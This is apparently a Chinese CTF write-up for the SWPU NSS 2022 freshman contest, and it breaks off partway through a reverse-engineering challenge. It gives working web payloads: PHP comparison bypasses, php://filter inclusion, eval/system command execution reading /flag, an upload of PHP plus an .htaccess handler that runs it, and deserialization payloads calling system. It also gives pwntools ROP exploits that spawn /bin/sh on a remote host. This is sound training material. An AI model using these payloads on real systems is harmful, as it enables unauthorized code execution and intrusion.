

# ***SWPU NSS 2022 新生赛***



# WEB



## 1.funny_web

先试试随便填写一点内容，然后显示:**用户名是实验室名哦~**  
得知是 **NSS**  
再次提交后显示：**听说密码是招新群某位的QQ**  
第一时间就想到了我们的谢队的QQ~**2122693401** 

于是进入**rea11y.php**来到第一道题  

```php+HTML
<?php
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
highlight_file(__FILE__);
include('flag.php');
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num != '12345') {
        if (intval($num) == '12345') {
            echo $FLAG;
        }
    } else {
        echo "这为何相等又不相等";
    }
}
```

首先**$num != '12345'**这里是弱比较  
其次还要截断**intval()**
于是想到了用一些手段 来截断**intval()**函数  
当向**intval()**传入的参数，不是<font color="#0000dd">int</font>时，会返回`1`

然后手写payload  
于是可以写成以下形式  

```
?num=12345/
```

或者  

```
?num=12345\
```

等一些符号
最后得到flag，提交。

<img src="https://nssctf.wdf.ink/img/zack/funny_web.jpg">



## 2.奇妙的MD5

直接搜索 **可曾听过ctf 中一个奇妙的字符串**

![奇妙的字符串](https://nssctf.wdf.ink/img/zack/奇妙的字符串.jpg)

查到**ffifdyop**为万能sql注入密码

提交后，转到**c0nt1nue.php**  按<kbd>F12</kbd>查看网页源码

```php+HTML
<!--
$x= $GET['x'];
$y = $_GET['y'];
if($x != $y && md5($x) == md5($y)){
    ;
-->
```

这里的**md5($x) == md5($y)**为弱比较，随便找两个0e开头的字符串

手写payload并提交

```
?x=QNKCDZO&y=240610708
```

转到**f1na11y.php**

```php+HTML
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
}
```

这里直接用数组绕过

手写payload并**POST**

```
wqh[]=1&dsy[]=0
```

最后得到flag

![奇妙的md5](https://nssctf.wdf.ink/img/zack/奇妙的md5.jpg)



## 3.where_am_i

根据提示：**什么东西是11位啊？**

盲猜是手机号之类的

但额外还有一张配图，试试把它丢进某度搜索

![where am i_search](https://nssctf.wdf.ink/img/zack/where_am_i_search.jpg)

依次查找，最后在这篇文章里找到了所在的位置

![where am i_locate](https://nssctf.wdf.ink/img/zack/where_am_i_locate.jpg)

![where am i_position](https://nssctf.wdf.ink/img/zack/where_am_i_position.jpg)

所以这张图所在地址是**锦江区暑袜北一街145号**，然后再次利用某度搜索

![where am i_phone](https://nssctf.wdf.ink/img/zack/where_am_i_phone.jpg)

确定了我们要输入的11位数就是这个电话号码**02886112888**，提交，得到flag

![where am i_ending](https://nssctf.wdf.ink/img/zack/where_am_i_ending.jpg)



## 4.ez_ez_php

先分析一下代码

```php+HTML
<?php
error_reporting(0);
if (isset($_GET['file'])) {
  if ( substr($_GET["file"], 0, 3) === "php" ) {
    echo "Nice!!!";
    include($_GET["file"]);
  } 

  else {
    echo "Hacker!!";
  }
}else {
  highlight_file(__FILE__);
}
//flag.php
```

这里很明显是要用php伪协议:**php://filter**

构造payload

```
?file=php://filter/resource=flag.php
```

![ez_php_flag.php](https://nssctf.wdf.ink/img/zack/ez_php_flag.php.jpg)

提示**real_flag_is_in_'flag'**

再次提交payload

```
?file=php://filter/resource=flag
```

得到flag

![ez_php_flag](https://nssctf.wdf.ink/img/zack/ez_php_flag.jpg)

**非预期解**

复现的时候发现可以直接访问**flag**

![ez_php_dir](https://nssctf.wdf.ink/img/zack/ez_php_dir.jpg)



## 5.webdog1__start

启动靶机显示内容为:

**Do you really reading to start be a web dog? **

**DO you think you go here from where?**

**are you readying to start?**

根据暗示，可以猜测是要访问 **start.php**，果然有内容，但是暂时似乎没有什么可用内容，那先返回看看有没有其它线索。

![web_dog](https://nssctf.wdf.ink/img/zack/web_dog.jpg)

但是在主页查看网页源代码后会发现有这样一段

```php+HTML
<!--
if (isset($_GET['web']))
{
    $first=$_GET['web'];
    if ($first==md5($first)) 
     
-->
```

搜索到**0e215962017**的md5值为**0e291242476940776845150308577824**，那么就提交这个。

但是发现提交后也是跳转到**start.php**，只能说明和上面的hint是同一条路线。

那就继续看看**start.php**里面是不是有什么线索漏掉了？

打开Burp，发现响应头里有个**hint**

![web_dog_start_1](https://nssctf.wdf.ink/img/zack/web_dog_start_1.jpg)

尝试访问**f14g.php**，嗯，被耍了

![web_dog_start_f14g](https://nssctf.wdf.ink/img/zack/web_dog_start_f14g.jpg)

但是再到Burp里看，这次的**hint**指向了**F1l1l1l1l1lag.php**![web_dog_start_2](https://nssctf.wdf.ink/img/zack/web_dog_start_2.jpg)

访问后得到如下代码

```php+HTML
<?php
error_reporting(0);


highlight_file(__FILE__);



if (isset($_GET['get'])){
    $get=$_GET['get'];
    if(!strstr($get," ")){
        $get = str_ireplace("flag", " ", $get);
        
        if (strlen($get)>18){
            die("This is too long.");
            }
            
            else{
                eval($get);
          } 
    }else {
        die("nonono"); 
    }

}


    

?>
```

首先，这里对参数**get**作了长度限制，并且要过滤掉**flag**字符串，如果要输入的指令太长，并且还要输入**flag**，那么就想，能不能让指向另外一个参数呢？

先测试这个想法能不能通过，于是构造如下payload

```
?get=eval($_GET['A']);&A=die("01234567890123456789我是flag我是flag");
```

![web_dog_final](https://nssctf.wdf.ink/img/zack/web_dog_final.jpg)

很明显这个长度已经远超**18**的限制，并且**flag**字符串也没被过滤掉，那就证明了这个思路是正确的。

那么先尝试查看一下当前目录有什么文件呢，让他执行一下**ls**

```
?get=eval($_GET['A']);&A=system('ls');
```

![web_dog_final_2](D:\CTF Tools\SWPU NSS新生赛 2022\web_images\web_dog_final_2.jpg)

发现一个flag.php，那试试**cat flag.php**?

```
?get=eval($_GET['A']);&A=system('cat flag.php');
```

![web_dog_final_3](https://nssctf.wdf.ink/img/zack/web_dog_final_3.jpg)

但是很遗憾，没回显，说明这个flag.php是假的

那么尝试一下搜索查看一下根目录有没有

```
?get=eval($_GET['A']);&A=system('ls /');
```

![web_dog_final_4](D:\CTF Tools\SWPU NSS新生赛 2022\web_images\web_dog_final_4.jpg)

发现根目录下有一个flag，现在再尝试用**cat /flag**

```
?get=eval($_GET['A']);&A=system('cat /flag');
```

![web_dog_flag](https://nssctf.wdf.ink/img/zack/web_dog_flag.jpg)

得到flag，本题结束



## 6.Ez_upload

先随便传一个文件试试

![ez_upload_wtf](https://nssctf.wdf.ink/img/zack/ez_upload_wtf.jpg)

传不进去，那就打开**Burp**看看

![ez_upload_burp](https://nssctf.wdf.ink/img/zack/ez_upload_burp.jpg)

先把文件内容删除试试，再提交看看

![ez_upload_burp_1](https://nssctf.wdf.ink/img/zack/ez_upload_burp_1.jpg)

发现成功上传了，那试试传一个**phpinfo();**

```php+HTML
<?php phpinfo();?>
```

![ez_upload_burp_2](https://nssctf.wdf.ink/img/zack/ez_upload_burp_2.jpg)

不正确，那先不用**php**的文件后缀名再试试呢？

![ez_upload_burp_3](https://nssctf.wdf.ink/img/zack/ez_upload_burp_3.jpg)

这里没有再提示文件后缀名的问题，而是另外一个提示。说明很有可能是过滤了**<?**的前缀，那就不能用**<?php >**这种表达方式，于是就换一个，用**<script**

上传如下语句

```php+HTML
<script language="php">phpinfo();</script>
```

然后就发现上传成功了，打开指定目录下的文件也确实存在这个语句。

![ez_upload_burp_4](https://nssctf.wdf.ink/img/zack/ez_upload_burp_4.jpg)

![ez_upload_zm](https://nssctf.wdf.ink/img/zack/ez_upload_zm.jpg)

但现在问题是，这个文件名后缀是**.zm**，是不会执行里面的代码的，那么我们就要想办法让它识别成**php**代码运行起来

这里先引用一下别人写的一个东西

什么是htaccess文件



> #### 简介



**.htaccess**是一个配置文件，用于运行Apache网络服务器软件的网络服务器上。当**.htaccess**文件被放置在一个 "通过Apache Web服务器加载 "的目录中时，**.htaccess**文件会被Apache Web服务器软件检测并执行。这些**.htaccess**文件可以用来改变Apache Web服务器软件的配置，以启用/禁用Apache Web服务器软件所提供的额外功能和特性。

**.htaccess**文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。

------

所以，这里再上传一个**.htaccess**文件，让它能够把**.zm**文件识别成**.php**文件并运行

```
AddType application/x-httpd-php .zm
```

![ez_upload_burp_5](https://nssctf.wdf.ink/img/zack/ez_upload_burp_5.jpg)

成功上传，现在再次访问之前上传的**aaa.zm**就能运行上传的**php**代码了，然后找到**flag**，本题结束。

![ez_upload_flag](https://nssctf.wdf.ink/img/zack/ez_upload_flag.jpg)



## 7.numgame

打开靶机你能发现的第一件事情是，调到**20**会变成**-20**(???)

第二件事情是，你会发现按<kbd>F12</kbd>打不开开发者工具，鼠标右键菜单也摁不出来

先说第二个事情，因为这个好解决，那就是：除了按<kbd>F12</kbd>，你还可以按<kbd>Shift</kbd>+<kbd>Ctrl</kbd>+<kbd>I</kbd>。但很遗憾的是，这样操作并不行，那就直接打开选项菜单启动开发者工具

![numgame_start](https://nssctf.wdf.ink/img/zack/numgame_start.png)

可能你会觉得不太好看，那这个时候你就可以按<kbd>Ctrl</kbd>+<kbd>U</kbd>开启全屏浏览体验

![numgame_2](https://nssctf.wdf.ink/img/zack/numgame_2.jpg)

可以很清楚地看到，这个网页的脚本是定位在**./js/1.js**，继续追查得到如下代码

```javascript
var input = $('input'),
    input_val = parseInt(input.val()),
    btn_add = $('.add'),
    btn_remove = $('.remove');

input.keyup(function() {
    input_val = parseInt(input.val())
});

btn_add.click(function(e) {
    input_val++;
    input.val(input_val);
    console.log(input_val);
    if(input_val==18){
        input_val=-20;
        input.val(-20);

    }
});

btn_remove.click(function(e) {
    input_val--;
    input.val(input_val);
});
// NSSCTF{TnNTY1RmLnBocA==}
```

结尾**NSSCTF{TnNTY1RmLnBocA==}**用base64解码得到**NsScTf.php**

```php+HTML
<?php
error_reporting(0);
//hint: 与get相似的另一种请求协议是什么呢
include("flag.php");
class nss{
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m",$_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```

首先注意到的是**call_user_func()**这个函数

但是，要知道**php**是不区分大小写的，假设在这里传入的是字符串，那字面量没法解析

于是构造payload

```html
?p=Nss::Ctf
```

得到结果

![numgame_3](https://nssctf.wdf.ink/img/zack/numgame_3.jpg)

但是他说是nss2，那就再改

```
?p=Nss2::Ctf
```

于是得到flag,本题结束。

![numgame_flag](https://nssctf.wdf.ink/img/zack/numgame_flag.jpg)



## 8.ez_ez_php(revenge) 

与第4题**ez_ez_php**同理，这里不再多赘述

![ez_ez_php_reverge](https://nssctf.wdf.ink/img/zack/ez_ez_php_reverge.jpg)



## 9.ez_rec

打开靶机:真的什么都没有吗？

直接先御剑一顿乱扫，扫出个**robots.txt**，打开又指向了**/NSS/index.php/**

![web_dog_robots.txt](https://nssctf.wdf.ink/img/zack/web_dog_robots.txt.jpg)

![ez_rec_robots](https://nssctf.wdf.ink/img/zack/ez_rec_robots.jpg)

继续，随后是ThinkPHP V5.0(?)

![ez_rec_index](https://nssctf.wdf.ink/img/zack/ez_rec_index.jpg)

立马想到用个第三方工具来找，我这里用的是**ThinkphpGUI By 莲花**

![ez_rec_GUI](https://nssctf.wdf.ink/img/zack/ez_rec_GUI.jpg)

先试试用**find**命令来找一下flag在哪

```
find / -name flag*
```

![ez_rec_GUI_ls](https://nssctf.wdf.ink/img/zack/ez_rec_GUI_ls.jpg)

然后一看，那肯定是**/nss/ctf/flag/flag**

那就直接用**cat**命令来显示flag就行了

```
cat /nss/ctf/flag/flag
```

![ez_rec_GUI_flag](D:\CTF Tools\SWPU NSS新生赛 2022\web_images\ez_rec_GUI_flag.jpg)

得到flag，本题结束。



## 10.1z_unserialize

启动靶机，网页代码如下

```php+HTML
<?php
 
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;

        $a($this->lly);
     }
    
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
 
 
?> 
```

分析一下代码，就是一个很简单的序列化

这里**lt**就是要执行的函数，**lly**是要传给函数的参数

手写一个payload，先看一下目录里面有些啥

```
nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:2:"ls";}
```

![ez_unserilize_start](https://nssctf.wdf.ink/img/zack/ez_unserilize_start.jpg)

回显只有**index.php**

看来似乎得想别的办法，试试搜索一下flag呢

```
nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:18:"find / -name flag*";}
```

![ez_unserilize_find](https://nssctf.wdf.ink/img/zack/ez_unserilize_find.jpg)

发现flag在根目录下，那就直接让它显示出来

```
nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:9:"cat /flag";}
```

![ez_unserilize_flag](https://nssctf.wdf.ink/img/zack/ez_unserilize_flag.jpg)

找到flag，本题结束。



## 11.xff

打开靶机显示**Must be accessed from Xiaohong's own computer.**

先用hackbar添加**X-Forwarded-For**到**127.0.0.1**

返回显示**Must be jump from Home Page.**

再次利用hackbar添加**Referer**到**127.0.0.1**

轻松得到flag

![xff](https://nssctf.wdf.ink/img/zack/xff.jpg)



## 12.js_sign

启动靶机，打开开发者工具发现指向了**main.js**，打开后分析

```javascript
document.getElementsByTagName("button")[0].addEventListener("click", ()=>{
    flag="33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15"
    if (btoa(flag.value) == 'dGFwY29kZQ==') {
        alert("you got hint!!!");
    } else {
        alert("fuck off !!");
    }    
})
```

将**dGFwY29kZQ==**解码后得到提示:**tapcode**

网上实在是没找到合适的tapcode解码工具，于是我去找了一张tapcode对照表

![tapcode对照表](https://nssctf.wdf.ink/img/zack/tapcode对照表.png)

按照对照表手动翻译了一遍，得到结果：

```
NSSCTFYOUFINDFLAGBYTAPCODE
```

按照平台格式要求，最终flag为**NSSCTF{youfindflagbytapcode}**



## 13.ez_ez_unserialize

启动靶机，源码如下

```php+HTML
<?php
class X
{
    public $x = __FILE__;
    function __construct($x)
    {
        $this->x = $x;
    }
    function __wakeup()
    {
        if ($this->x !== __FILE__) {
            $this->x = __FILE__;
        }
    }
    function __destruct()
    {
        highlight_file($this->x);
        //flag is in fllllllag.php
    }
}
if (isset($_REQUEST['x'])) {
    @unserialize($_REQUEST['x']);
} else {
    highlight_file(__FILE__);
}
```

根据分析，这道题要绕过**__wakeup()**

众所周知，当序列化成员数大于实际成员数时，**__wakeup()**不会执行

于是构造出的payload如下

```
?x=O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}
```

![ez_ez_unserialize_12](https://nssctf.wdf.ink/img/zack/ez_ez_unserialize_12.jpg)

得到flag，提交，本题结束。



## 14.funny_php

分析代码，看着是挺多的，其实仔细看完会发现是很简单的一道题。

```php+HTML
<?php
    session_start();
    highlight_file(__FILE__);
    if(isset($_GET['num'])){
        if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
            echo ":D";
            $_SESSION['L1'] = 1;
        }else{
            echo ":C";
        }
    }
    if(isset($_GET['str'])){
        $str = preg_replace('/NSSCTF/',"",$_GET['str']);
        if($str === "NSSCTF"){
            echo "wow";
            $_SESSION['L2'] = 1;
        }else{
            echo $str;
        }
    }
    if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
        if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
            echo "Nice!";
            if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
                if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                    echo "yoxi!";
                    $_SESSION['L3'] = 1;
                }else{
                    echo "X(";
                }
            }
        }else{
            echo "G";
            echo $_POST['md5_1']."\n".$_POST['md5_2'];
        }
    }
    if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
        include('flag.php');
        echo $flag;
    }

    
?>
```

看完后也就是说，要同时满足**L1、L2、L3**都存在，那就一个一个的分析好了。

先看**L1**，既要长度小于3，又要数据大于999999999，怎么会有这么奇怪的逻辑判断，不讲武德直接数组绕过

```
?num[]=0
```

![funny_php_L1](https://nssctf.wdf.ink/img/zack/funny_php_L1.jpg)

回显**:D**，表示成功绕过，现在再来看**L2**

**L2**只是简单的把**NSSCTF**这个字符串给替换掉了，那应对方式也很简单，写成**N<font color="#FFAAFF">NSSCTF</font>SSCTF**这种形式，即可绕过

```
?num[]=0&str=NNSSCTFSSCTF
```

![funny_php_L2](https://nssctf.wdf.ink/img/zack/funny_php_L2.jpg)

回显**wow**，说明**L2**也过了，现在再看**L3**

这里只是md5的弱比较，那就随便找一组md5都为0e开头的字符串

```
md5_1=QNKCDZO&md5_2=s1885207154a
```

![funny_php_L3](https://nssctf.wdf.ink/img/zack/funny_php_L3.jpg)

得到flag，本题结束。





# PWN

## 1.Does your nc work？

用netcat签到

![nc](https://nssctf.wdf.ink/img/zack/nc.jpg)





## 2.Integer Overflow

先丢进IDA

本来是想控制eax的，然后往里面写入**/bin/sh**, 再调用system, 结果没找到eax, 索性就继续往上找, 发现可以用ebx来间接控制eax

![interger_ida1](https://nssctf.wdf.ink/img/zack/interger_ida1.jpg)

然后调试，最后exp如下

```python
from pwn import *

ele = ELF("./pwn", checksec=False)
p = remote("1.14.71.254", 28600)
ebx = 0x08049022

#----------------#
p.recvuntil(b"Tell me your choice:",True)
p.sendline(b"1")

p.recvuntil(b"First input the length of your name:",True)
p.sendline(b"-1")

p.recvuntil(b"What's u name?",True)
p.sendline(b'a'*0x24 + p32(ebx) + p32(next(ele.search(b"/bin/sh\x00")) + 0x1e71) + p32(ele.symbols['pwn_me'] + 43))

p.interactive()
```

运行，然后得到flag

![interger_flag](https://nssctf.wdf.ink/img/zack/interger_flag.jpg)



## 3.有手就行的栈溢出

先用IDA分析

![interger_ida](https://nssctf.wdf.ink/img/zack/interger_ida.jpg)

翻到fun(?)，追一下

![interger_ida2](https://nssctf.wdf.ink/img/zack/interger_ida2.jpg)

定位了，然后手搓exp

```python
from pwn import *

e = ELF("./pwn", checksec=False)
p = remote("1.14.71.254",28187)
rsi = 0x0000000000401301
rdi = 0x0000000000401303

#----------------#

p.recvuntil(b'\n',True)
p.sendline(b'a'*0x28 + p64(rdi) + p64(next(e.search(b"/bin/sh\x00"))) + p64(rsi) + p64(0)*2 + p64(e.plt['execve']))

p.interactive()
```

运行，然后得到flag

![有手就行的栈溢出_flag](https://nssctf.wdf.ink/img/zack/有手就行的栈溢出_flag.jpg)

（小声BB：我自己做着都是云里雾里的，至今没有彻底搞懂，而且当时在Ubuntu用的工具都找不到了，WriteUp能写成这样也已经是我的极限了）





# REVERSE

## 1.贪吃蛇

打开程序，先记住**notice**说了什么，因为待会我会再提这个

![贪吃蛇_start](https://nssctf.wdf.ink/img/zack/贪吃蛇_start.jpg)

先尝试丢进IDA里分析一下，

![贪吃蛇_ida](https://nssctf.wdf.ink/img/zack/贪吃蛇_ida.jpg)

发现这里的胜利条件判断是减去了**4**,，再结合游戏实际情况分析，这里的**a1**是蛇身长度，**a1 - 4**(减去蛇身长度)才是玩家得到的实际分数。

奈何逆向技术不咋样，想到用**CheatEngine**开挂。

刚刚分析了，蛇身是以**a1**来存储的，现在的分数是**1**分，那么此时蛇身长度为**5**

![贪吃蛇_ce1](https://nssctf.wdf.ink/img/zack/贪吃蛇_ce1.jpg)

找到了一大堆，不能确定到底是哪个，那现在再让它吃一分，让分数变成**2**,蛇身长度变成**6**

![贪吃蛇_ce2](https://nssctf.wdf.ink/img/zack/贪吃蛇_ce2.jpg)

很轻松找到了我们想要修改的值，那么此时修改任意一个大于**64**的数字

![贪吃蛇_ce3](https://nssctf.wdf.ink/img/zack/贪吃蛇_ce3.jpg)

然后让蛇蛇撞墙，程序结算游戏，符合判断，得到flag。

![贪吃蛇_flag](https://nssctf.wdf.ink/img/zack/贪吃蛇_flag.jpg)

你以为到这里就结束了？？？**NO！！！**

我之前就说了，你还记住**notice**写了什么吗？！？！

![贪吃蛇_hi](https://nssctf.wdf.ink/img/zack/贪吃蛇_hi.jpg)

我要痛批出题人！为什么把判断写成**a1 - 4 < 60**而不是**a1 - 4 <= 60**，因为我当时花了2个小时来打，好不容易打到60分，然后cant get flag QWQ

甘霖娘咧！！！！！！

![贪吃蛇_cantflag](https://nssctf.wdf.ink/img/zack/贪吃蛇_cantflag.jpg)

求求出题人能对孩子们温柔以待。



## 2.babyre

用IDA打开就看到flag

![babyre](https://nssctf.wdf.ink/img/zack/babyre.jpg)



## 3.easyre

用IDA打开就找到flag

![easyre](https://nssctf.wdf.ink/img/zack/easyre.jpg)



##  4.xor

用IDA打开，发现全部用异或操作了

![xor_ida](https://nssctf.wdf.ink/img/zack/xor_ida.jpg)

用cpp写，异或回去

```c++
#include <iostream>
#include <string>

using namespace std;
int main(){
	string str = "LQQAVDyZMP]3q]emmf]uc{]vm]glap{rv]dnce";
	char c;
	for(int i=0; i<= str.length(); i++){
		c = str[i] ^ 2;
		cout << c;
	}
}
```

运行，得到flag

![xor_flag](https://nssctf.wdf.ink/img/zack/xor_flag.jpg)



## 5.upx

首先upx脱壳

![upx_de](https://nssctf.wdf.ink/img/zack/upx_de.jpg)

丢进IDA分析

![upx_ida](https://nssctf.wdf.ink/img/zack/upx_ida.jpg)

和第4题xor一样，用cpp写，异或回去

```c++
#include <iostream>
#include <string>

using namespace std;
int main(){
	string str = "LQQAVDyWRZ]3q]zmpf]uc{]vm]glap{rv]dnce";
	char c;
	for(int i=0; i<= str.length(); i++){
		c = str[i] ^ 2;
		cout << c;
	}
}
```

运行，得到flag

![upx_flag](https://nssctf.wdf.ink/img/zack/upx_flag.jpg)



## 6.base64

直接用IDA分析

![base64_ida](https://nssctf.wdf.ink/img/zack/base64_ida.png)

追一下，找到用base64编码的flag

![base64](https://nssctf.wdf.ink/img/zack/base64.jpg)

解码后得到flag

```
NSSCTF{base_64_NTWQ4ZGDNC7N}
```



## 7.base64-2

和上一题一样，发现这次是替换了码表

![base64-2-ida](https://nssctf.wdf.ink/img/zack/base64-2-ida.jpg)

于是用C#写了一个能自定义码表的base64解码

```c#
using System.Text;

namespace CustomBase64
{
    public class Base64Crypt
    {
        private string S;
        private string K;
        private List<char> T;
        public Base64Crypt()
        {
            T = new List<char>();
            K = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/";
            //K = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";//标准码表
        }
        public string Token
        {
            get
            {
                return S == null ? K : S;
            }
            set
            {
                T.Clear();
                S = value;
                if (S == null)
                {
                    foreach (var item in K)
                    {
                        T.Add(item);
                    }
                }
                else if (S.Length < 64)
                {
                    foreach (var item in S)
                    {
                        T.Add(item);
                    }
                    for (int i = 0; i < 64 - S.Length; i++)
                    {
                        T.Add(K[i]);
                    }
                }
                else
                {
                    for (int i = 0; i < 64; i++)
                    {
                        T.Add(S[i]);
                    }
                }
            }
        }
        public string Encode(string x)
        {
            return string.IsNullOrEmpty(x) ? x : InternalEncode(Encoding.UTF8.GetBytes(x));
        }
        public string Decode(string x)
        {
            return string.IsNullOrEmpty(x) ? x : Encoding.UTF8.GetString(InternalDecode(x));
        }
        public byte[] Encode(byte[] x)
        {
            return x == null ? null : Encoding.UTF8.GetBytes(InternalEncode(x));
        }
        public byte[] Decode(byte[] x)
        {
            return x == null ? null : InternalDecode(Encoding.UTF8.GetString(x));
        }
        private void CheckToken()
        {
            if (T.Count != 64)
            {
                Token = K;
            }
        }
        private byte[] InternalDecode(string x)
        {
            CheckToken();
            byte[] r;
            string t;
            int p = 0;
            int m = x.Length / 4;
            int n = x.Length % 4;
            if (n == 0)
            {
                r = new byte[3 * m];
            }
            else
            {
                r = new byte[3 * m + n - 1];
                t = string.Empty;

                for (int i = n; i > 0; i--)
                {
                    t += ByteToBin((byte)T.IndexOf(x[x.Length - i])).Substring(2);
                }

                for (int i = 0; i < n - 1; i++)
                {
                    r[3 * m + i] = BinToByte(t.Substring(8 * i, 8));
                }
            }
            for (int i = 0; i < m; i++)
            {
                t = string.Empty;
                for (int j = 0; j < 4; j++)
                {
                    t += ByteToBin((byte)T.IndexOf(x[4 * i + j])).Substring(2);
                }
                for (int j = 0; j < t.Length / 8; j++)
                {
                    r[p++] = BinToByte(t.Substring(8 * j, 8));
                }
            }
            return r;
        }
        private string InternalEncode(byte[] x)
        {
            CheckToken();
            string r = string.Empty;
            string t;
            int m = x.Length / 3;
            int n = x.Length % 3;
            for (int i = 0; i < m; i++)
            {
                t = string.Empty;
                for (int j = 0; j < 3; j++)
                {
                    t += ByteToBin(x[3 * i + j]);
                }
                r += base64Encode(t);
            }

            if (n == 1)
            {
                t = ByteToBin(x[x.Length - 1]).PadRight(12, '0');
                r += base64Encode(t);
            }
            else if (n == 2)
            {
                t = string.Empty;
                for (int i = n; i > 0; i--)
                {
                    t += ByteToBin(x[x.Length - i]);
                }
                t = t.PadRight(18, '0');
                r += base64Encode(t);
            }
            return r;
        }
        private string base64Encode(string x)
        {
            string r = string.Empty;
            for (int i = 0; i < x.Length / 6; i++)
            {
                r += T[BinToByte(x.Substring(6 * i, 6))];
            }
            return r;
        }
        private string ByteToBin(byte x)
        {
            return Convert.ToString(x, 2).PadLeft(8, '0');
        }
        private byte BinToByte(string x)
        {
            return Convert.ToByte(x, 2);
        }

    }
}
```

```c#
using CustomBase64;

var Base64 = new Base64Crypt();
Console.WriteLine(Base64.Decode("GyAGD1ETr3AcGKNkZ19PLKAyAwEsAIELHx1nFSH2IwyGsD=="));

```

运行，得到flag

![base64-2-flag](https://nssctf.wdf.ink/img/zack/base64-2-flag.jpg)



## 8.android

apk本质上是压缩包，解压就行。

![android](https://nssctf.wdf.ink/img/zack/android.jpg)

然后搜索一下那个文件里面有flag？

恰好在classes3.dex找到flag

![android_1](https://nssctf.wdf.ink/img/zack/android_1.jpg)



## 9.py1

摆烂摆烂，不会逆向，直接做数学题罢

![py1](https://nssctf.wdf.ink/img/zack/py1.jpg)

用cpp算出来就行

```C++
#include <iostream>

using namespace std;
int main(){
	//int a = 2684 ^ 2486;// =970
	//int a = 258 ^ 369;// =115
	char a = 'a' ^ 'z';// =27
	cout << int(a);
}
```



## 10.py2

不难发现程序是py打包好的exe文件，于是用**PyInstaller Extractor**对其解包

![py2](https://nssctf.wdf.ink/img/zack/py2.jpg)

发现可疑的**re2.pyc**，再对其用**uncompyle**反编译

![py2_pyc](https://nssctf.wdf.ink/img/zack/py2_pyc.jpg)

打开，得到源代码

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 2.7.18 (default, Jul  1 2022, 10:30:50) 
# [GCC 11.2.0]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: re2.py
import base64
print("Input 'start' to start game:")
scanf = input()
if scanf == 'start':
    exit(0)
else:
    if scanf == 'TlNTQ1RGe29oaGghXzNhc3lfcHlyZX0K':
        print(base64.b64decode('TlNTQ1RGe29oaGghXzNhc3lfcHlyZX0K'.encode('UTF-8')))
        os.system('pause')
    else:
        print("Please input 'start' to start game~")
# okay decompiling re2.pyc
```

然后输入回去，得到flag

![py2_flag](https://nssctf.wdf.ink/img/zack/py2_flag.jpg)



## 11.pypy

与**py2**相同，对其用**uncompyle**进行反编译

![pypy](https://nssctf.wdf.ink/img/zack/pypy.jpg)

打开，得到的源代码如下：

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 2.7.18 (default, Jul  1 2022, 10:30:50) 
# [GCC 11.2.0]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: 1.py
# Compiled at: 2022-09-17 15:54:07
# Size of source mod 2**32: 1433 bytes


def init_S():
    global S
    for i in range(256):
        S.append(i)


def init_T():
    global Key
    global T
    Key = 'abcdefg'
    keylen = len(Key)
    for i in range(256):
        tmp = Key[(i % keylen)]
        T.append(tmp)


def swap_S():
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(T[i])) % 256
        tmp = S[i]
        S[i] = S[j]
        S[j] = tmp


def Get_KeyStream():
    global KeyStream
    global text
    txtlen = len(text)
    j, t = (0, 0)
    for i in range(txtlen):
        i = i % 256
        j = (j + S[i]) % 256
        tmp = S[i]
        S[i] = S[j]
        S[j] = tmp
        t = (S[i] + S[j]) % 256
        KeyStream.append(S[t])


def Get_code():
    res = []
    for i in range(len(text)):
        res.append(ord(text[i]) ^ KeyStream[i])

    return res


if __name__ == '__main__':
    T, S, Key = [], [], []
    PlainText, CryptoText, KeyStream = '', '', []
    text = input('please input you flag:\n')
    if not text:
        print('bad')
        exit()
    init_S()
    init_T()
    swap_S()
    Get_KeyStream()
    res = Get_code()
    print(res)
    for i, ele in enumerate(res):
        if not ele == [84, 91, 254, 48, 129, 210, 135, 132, 112, 234, 208, 15, 213, 39, 108, 253, 86, 118, 248][i]:
            print('bad')
            exit()

    print('good')
# global CryptoText ## Warning: Unused global
# global PlainText ## Warning: Unused global
# okay decompiling pyAndR.pyc
```

是不是觉得很复杂？其实稍微修改一下一两个地方就行可以，让它倒过来运行。我先给他多写了一个**Get_Decode()**函数，并且让**txtlen**恒定为一个大于等于**19**的数。

```python
def Get_KeyStream():
    global KeyStream
    txtlen = 19 # >= 19
    j, t = (0, 0)
    for i in range(txtlen):
        i = i % 256
        j = (j + S[i]) % 256
        tmp = S[i]
        S[i] = S[j]
        S[j] = tmp
        t = (S[i] + S[j]) % 256
